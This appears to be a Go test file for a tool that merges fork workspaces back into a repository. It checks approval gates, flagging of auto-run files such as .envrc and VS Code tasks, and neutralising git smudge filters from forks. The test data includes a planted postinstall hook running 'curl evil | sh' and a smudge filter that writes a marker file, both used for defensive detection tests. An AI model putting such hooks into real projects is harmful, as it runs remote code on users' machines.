func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
	repo := initRepo(t)
	// Stage two fork workspaces so forkspace.Names lists them; their mere existence is enough — the
	// approval gate fires before any fetch/land/destroy.
	for _, n := range []string{"a", "b"} {
		if err := os.MkdirAll(forkspace.Workspace(repo, n), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	c := &Control{cfg: &config.Config{}}
	// Non-interactive stdin (go test) with yes=false → approve() returns false → bulk land is a
	// no-op. Without the gate this path would fetch, land, and DELETE every fork unattended.
	code, err := c.forkMergeAll(repo, forkspace.Names(repo), "", false, false)
	if err != nil || code != 0 {
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	for _, n := range []string{"a", "b"} {
		if !pathExists(forkspace.Workspace(repo, n)) {
			t.Errorf("fork %s was destroyed without approval", n)
		}
	}
}

func TestInteractionRiskPath(t *testing.T) {
	cases := []struct {
		status, path string
		flagged      bool
	}{
		{"A", ".envrc", true},
		{"M", ".envrc", true}, // a modified .envrc is a vector too
		{"A", "sub/.envrc", true},
		{"A", ".vscode/tasks.json", true},
		{"M", "x/.vscode/tasks.json", true},
		{"A", "Makefile", true},
		{"M", "Makefile", false}, // a modified Makefile is too common to flag
		{"A", "GNUmakefile", true},
		{"A", "src/main.go", false},
		{"A", "tasks.json", false}, // only flagged under .vscode/
		{"D", ".envrc", true},      // status[0]=='D' is filtered by the caller, not here
	}
	for _, c := range cases {
		if got := interactionRiskPath(c.status, c.path) != ""; got != c.flagged {
			t.Errorf("interactionRiskPath(%q, %q) flagged=%v, want %v", c.status, c.path, got, c.flagged)
		}
	}
}

// PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
// scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
// are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "base package.json")

	// A branch that introduces an .envrc and adds a postinstall script.
	git(t, repo, "checkout", "-q", "-b", "evil")
	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "evil")
	git(t, repo, "checkout", "-q", "main")

	w := strings.Join(PolicyScan(repo, "evil"), "\n")
	if !strings.Contains(w, ".envrc") {
		t.Errorf("PolicyScan did not flag .envrc:\n%s", w)
	}
	if !strings.Contains(w, "postinstall") {
		t.Errorf("PolicyScan did not flag the added postinstall script:\n%s", w)
	}

	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
	git(t, repo, "checkout", "-q", "-b", "benign", "main")
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","version":"2","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "bump")
	git(t, repo, "checkout", "-q", "main")
	if w := strings.Join(PolicyScan(repo, "benign"), "\n"); strings.Contains(w, "package.json adds") {
		t.Errorf("a benign package.json edit was wrongly flagged:\n%s", w)
	}
}

// A fork's in-tree .gitattributes + a fork-local smudge filter must not run on the land rebase's
// checkout. Includes a positive control (a raw re-checkout fires the smudge) so a green test means
// the neutralizer worked, not that the filter is dead.
func TestMergeNeutralizesForkDrivers(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "drv")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	marker := filepath.Join(t.TempDir(), "PWNED")
	smudge := "sh -c 'echo pwned >> " + marker + "; cat'"
	if err := os.WriteFile(filepath.Join(ws, ".gitattributes"), []byte("data.txt filter=x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "data.txt"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "filter.x.smudge", smudge)
	git(t, ws, "config", "filter.x.clean", "cat")
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent so landing must rebase (a checkout) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	// Positive control: a raw re-checkout of data.txt fires the smudge — the trap is live.
	_ = os.Remove(filepath.Join(ws, "data.txt"))
	_ = exec.Command("git", "-C", ws, "checkout", "--", "data.txt").Run()
	if !pathExists(marker) {
		t.Skip("the smudge filter did not fire on this git version — can't prove the neutralizer here")
	}
	_ = os.Remove(marker)

	// The land rebase must NOT fire it.
	landed, err := c.mergeOne(repo, "", "drv", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatal("the fork's smudge filter executed on the host during the land rebase")
	}
}

// `image inspect` fails the same way for a missing image and a dead daemon, so a merge gate blocked
// by a stopped runtime used to demand a build that would not have helped. Name the daemon instead.
func TestMergeGateBlamesTheDaemonNotTheImage(t *testing.T) {
	for _, tc := range []struct {
		name     string
		infoExit string
		want     string
	}{
		{"daemon unreachable", "1", "daemon isn't responding"},
		{"daemon up, image absent", "0", "isn't built"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Named "docker": EnsureDaemon probes only the Docker kind, which it reads off the binary.
			shim := filepath.Join(t.TempDir(), "docker")
			script := "#!/bin/sh\n" +
				"case \"$1\" in info) exit " + tc.infoExit + " ;; esac\n" +
				"case \"$1$2\" in imageinspect) exit 1 ;; esac\n" +
				"exit 0\n"
			if err := os.WriteFile(shim, []byte(script), 0o755); err != nil {
				t.Fatal(err)
			}
			c := &Control{
				cfg: &config.Config{Gate: []string{"true"}, BaseImage: "coop-box"},
				rt:  runtime.Runtime{Name: shim},
			}
			_, err := c.MergeGate(t.TempDir())
			if err == nil {
				t.Fatal("MergeGate succeeded with no image; want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("MergeGate = %q, want it to mention %q", err, tc.want)
			}
		})
	}
}
